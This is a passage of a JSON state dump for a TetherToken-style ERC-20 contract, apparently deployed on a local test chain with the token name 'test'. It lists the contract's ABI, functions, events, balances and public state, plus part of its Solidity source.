{\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xA94B7f0465E98609391C623d0560C5720a3f2D33": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99744397880000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "test",\n        "deprecated": false,\n        "totalSupply": 1,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 1,\n        "maximumFee": 10,\n        "_totalSupply": 1,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "test",\n        "basisPointsRate": 1,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            